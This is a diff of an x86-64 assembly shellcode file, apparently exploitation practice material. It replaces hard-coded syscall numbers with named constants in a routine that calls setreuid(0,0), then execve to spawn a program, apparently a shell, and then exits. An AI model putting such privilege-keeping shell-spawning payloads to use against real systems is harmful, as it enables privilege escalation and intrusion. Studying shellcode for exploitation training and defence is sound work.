@@ -4,18 +4,23 @@
 ; 60	sys_exit	int error_code
 ; 113	sys_setreuid	uid_t ruid	uid_t euid
 
+
+%define SYS_EXECVE 59
+%define SYS_EXIT 60
+%define SYS_SETREUID 113
+
 BITS 64
 section .text
 global _start
 _start:
 
-    push 113  ; set sys_setreuid syscal number to rax
+    push SYS_SETREUID  ; set sys_setreuid syscal number to rax
     pop rax
     xor rdi, rdi ; set 0 to rdi
     xor rsi, rsi ; set 0 to rsi
     syscall
 
-    push 59  ; set sys_execve syscal number to rax
+    push SYS_EXECVE  ; set sys_execve syscal number to rax
     pop rax
         
     xor rbx , rbx   ; set NULL to rbx
@@ -31,6 +36,6 @@ _start:
 
 
     xor rdi, rdi  ; set 0 to rdi
-    push 60  ; set sys_exit syscal number to rax
+    push SYS_EXIT  ; set sys_exit syscal number to rax
     pop rax
     syscall
